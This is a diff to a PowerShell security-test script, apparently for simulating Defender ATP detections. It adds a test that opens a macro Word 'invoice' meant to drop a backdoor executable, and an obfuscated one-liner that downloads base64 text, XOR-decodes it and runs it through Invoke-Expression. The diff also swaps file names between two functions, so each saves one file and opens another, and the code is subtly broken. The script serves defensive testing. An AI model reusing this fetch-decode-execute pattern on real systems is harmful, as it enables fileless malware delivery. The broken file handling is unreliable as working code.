@@ -155,6 +155,14 @@ function displaymenu($mitems) {
         Number = 33;
         Test = "Forms 2.0 HTML controls"
     }
+    $mitems += [PSCustomObject]@{
+        Number = 34;
+        Test = "Word document Backdoor drop"
+    }
+    $mitems += [PSCustomObject]@{
+        Number = 35;
+        Test = "PowerShell script in fileless attack"
+    }
     return $mitems
 }
 
@@ -1150,7 +1158,7 @@ function mshtmlvul() {
 function formshtml() {
     write-host -ForegroundColor white -backgroundcolor blue "`n--- 33. Forms HTML controls remote code execution ---"
     write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
-    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/Forms.HTML.docx -OutFile .\forms.html.docx
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/Forms.HTML.docx -OutFile .\RS4_WinATP-Intro-Invoice.docm
     write-host -foregroundcolor $processmessagecolor "Open document using Word"
     Start-Process winword.exe -ArgumentList ".\forms.html.docx"
     write-host "`n1. Click on the embedded item at top of document"
@@ -1159,6 +1167,44 @@ function formshtml() {
     pause
     write-host -foregroundcolor $processmessagecolor "`nDelete forms.html.docx"
     remove-item .\forms.html.docx  
+}
+
+function backdoordrop() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 34. Document drops backdoor ---"
+    write-host -foregroundcolor $processmessagecolor "Download test Word document to current directory"
+    Invoke-WebRequest -Uri https://github.com/directorcia/examples/raw/main/RS4_WinATP-Intro-Invoice.docm -OutFile .\forms.html.docx
+    write-host -foregroundcolor $processmessagecolor "Open document using Word"
+    Start-Process winword.exe -ArgumentList ".\RS4_WinATP-Intro-Invoice.docm"
+    write-host "`n1. Use the password = WDATP!diy# to open document"
+    write-host "2. Click enable editing if displayed" 
+    write-host "3. Click enable content if displayed"
+    write-host "4. Click the OK button on dialog if appears"
+    try {
+        $result = test-path($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe") -ErrorAction stop
+    }
+    catch {
+        $result = $false
+    }
+    if ($result) {
+        write-host -foregroundcolor $errormessagecolor "WinATP-Intro-Backdoor.exe - test FAILED`n"
+        write-host -foregroundcolor $processmessagecolor "Delete WinATP-Intro-Backdoor.exe"
+        remove-item ($env:USERPROFILE+"\desktop\WinATP-Intro-Backdoor.exe")
+    }
+    else {
+        write-host -foregroundcolor $processmessagecolor "WinATP-Intro-Backdoor.exe not found - test SUCCEEDED`n"
+    } 
+    write-host "5. Close Word once complete.`n"
+    pause
+    write-host -foregroundcolor $processmessagecolor "`nDelete RS4_WinATP-Intro-Invoice.docm"
+    remove-item .\RS4_WinATP-Intro-Invoice.docm  
+}
+
+function psfileless() {
+    write-host -ForegroundColor white -backgroundcolor blue "`n--- 35. PowerShell script in fileless attack ---"
+    write-host -foregroundcolor $processmessagecolor "Execute Fileless attack"
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    write-host -foregroundcolor $warningmessagecolor "If NOTEPAD is executed, then the test has FAILED`n"
+    pause
 }
 
 <#          Main                #>
@@ -1231,6 +1277,8 @@ switch ($results.number) {
     31  {hivevul}
     32  {mshtmlvul}
     33  {formshtml}
+    34  {backdoordrop}
+    35  {psfileless}
 }
 
 write-host -foregroundcolor $systemmessagecolor "`nSecurity test script completed"
